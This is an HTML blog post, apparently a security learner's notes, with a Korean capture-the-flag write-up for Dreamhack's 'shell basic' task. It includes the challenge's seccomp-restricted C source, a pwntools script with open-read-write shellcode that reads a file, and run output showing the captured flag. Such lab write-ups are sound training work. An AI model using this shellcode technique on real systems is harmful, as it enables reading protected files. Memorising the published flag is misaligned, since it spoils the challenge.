@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>shell basic · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>shell basic</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">Note</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<p>입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.</p>
+
+<p><code>main</code> 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.</p>
+
+<p>flag 파일의 위치와 이름은 <code>/home/shell_basic/flag_name_is_loooooong</code>입니다.</p>
+
+<p>감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!</p>
+
+<p>플래그 형식은 <code>DH{...}</code> 입니다. <code>DH{</code>와 <code>}</code>도 모두 포함하여 인증해야 합니다.</p>
+
+<h2>해결</h2>
+
+<pre><code class="language-bash">
+┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0310]
+└─$ cat shell_basic.c
+// Compile: gcc -o shell_basic shell_basic.c -lseccomp
+// apt install seccomp libseccomp-dev
+
+#include &lt;fcntl.h&gt;
+#include &lt;seccomp.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;signal.h&gt;
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(10);
+}
+
+void banned_execve() {
+  scmp_filter_ctx ctx;
+  ctx = seccomp_init(SCMP_ACT_ALLOW);
+  if (ctx == NULL) {
+    exit(0);
+  }
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
+
+  seccomp_load(ctx);
+}
+
+void main(int argc, char *argv[]) {
+  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  void (*sc)();
+
+  init();
+
+  banned_execve();
+
+  printf("shellcode: ");
+  read(0, shellcode, 0x1000);
+
+  sc = (void *)shellcode;
+  sc();
+}
+</code></pre>
+
+
+
+<pre><code class="language-python">
+cat ./exploit.py
+from pwn import *
+
+context.log_level = "info"
+context.arch = 'amd64'
+
+io = remote ("host3.dreamhack.games", 24081)
+
+shellcode = '''
+xor rax, rax
+push rax
+
+mov rax, 0x676e6f6f6f6f6f6f
+push rax
+mov rax, 0x6c5f73695f656d61
+push rax
+mov rax, 0x6e5f67616c662f63
+push rax
+mov rax, 0x697361625f6c6c65
+push rax
+mov rax, 0x68732f656d6f682f
+push rax
+
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 2
+syscall
+
+mov rdi, rax
+mov rsi, rsp
+sub rsi, 0x30
+mov rdx, 0x30
+mov rax, 0
+syscall
+
+mov rdi, 1
+mov rax, 1
+syscall
+'''
+
+payload = asm(shellcode)
+
+io.send(payload)
+
+print(io.recvall().decode('utf-8', errors = 'ignore'))
+</code></pre>
+
+<p>shellcode 에 <code>/home/shell_basic/flag_name_is_loooooong</code> 를 little endian 으로 넣어주었다.</p>
+
+<p><strong>open</strong> → <strong>read</strong> → <strong>write</strong></p>
+
+<pre><code class="language-powershell">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0310]
+└─$ python3 ./exploit.py
+[+] Opening connection to host3.dreamhack.games on port 24081: Done
+[+] Receiving all data: Done (59B)
+[*] Closed connection to host3.dreamhack.games port 24081
+shellcode: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
+\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+</code></pre>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
